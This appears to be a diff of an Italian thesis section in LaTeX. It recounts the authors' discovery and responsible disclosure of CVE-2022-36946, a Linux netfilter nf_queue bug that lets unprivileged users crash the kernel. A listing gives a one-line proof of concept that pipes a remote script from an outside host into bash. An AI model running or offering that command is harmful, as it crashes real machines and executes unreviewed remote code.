@@ -4,13 +4,9 @@
 
 Durante lo sviluppo di \gls{nfregex}, io e il mio collega Nicola Guerrera abbiamo scoperto una vulnerabilità di sicurezza che permetteva ad un utente malintenzionato di causare un crash del kernel.
 
-La vulnerabilità è stata inizialmente segnalata al team di sicurezza del kernel che rapidamente ha rilasciato una patch\footcite{netfilter: nf\_queue: do not allow packet truncation below transport header offset}{cve_2022_36946_patch}.
+La vulnerabilità è stata inizialmente segnalata al team di sicurezza del kernel che rapidamente ha rilasciato una patch\footcite{netfilter: nf\_queue: do not allow packet truncation below transport header offset}{cve_2022_36946_patch}. Successivamente è stata segnalata al MITRE, e quindi identificata come CVE-2022-36946\footcite{\url{https://nvd.nist.gov/vuln/detail/cve-2022-36946}}{cve_2022_36946}.
 
-Successivamente è stata segnalata al MITRE, e quindi identificata come CVE-2022-36946\footcite{\url{https://nvd.nist.gov/vuln/detail/cve-2022-36946}}{cve_2022_36946}.
-
-In un primo momento la problematica ci è sembrata difficilmente sfruttabile, in quanto pensavamo richiedesse necessariamente i privilegi di amministratore per essere correttamente sfruttata.
-
-Tuttavia, la vulnerabilità è stata classificata come critica (7.5 HIGH), in quanto con l'utilizzo dei linux namespace permette il crash del kernel anche tramite utenti non privilegiati.
+In un primo momento la problematica ci è sembrata difficilmente sfruttabile, in quanto pensavamo richiedesse necessariamente i privilegi di amministratore per essere correttamente sfruttata. Tuttavia, la vulnerabilità è stata classificata come critica (7.5 HIGH), in quanto con l'utilizzo dei linux namespace permette il crash del kernel anche tramite utenti non privilegiati.
 
 \begin{listing}[H]
 \begin{minted}[
@@ -21,6 +17,7 @@ Tuttavia, la vulnerabilità è stata classificata come critica (7.5 HIGH), in qu
 ]{bash}
 curl -sLf https://pwnzer0tt1.it/cve-2022-36946.sh | bash
 \end{minted}
+\vspace{-1em}
 \caption{One-Command tramite cui eseguire la \gls{poc} della CVE-2022-36946}\label{lst:poc_cve}
 \end{listing}
 
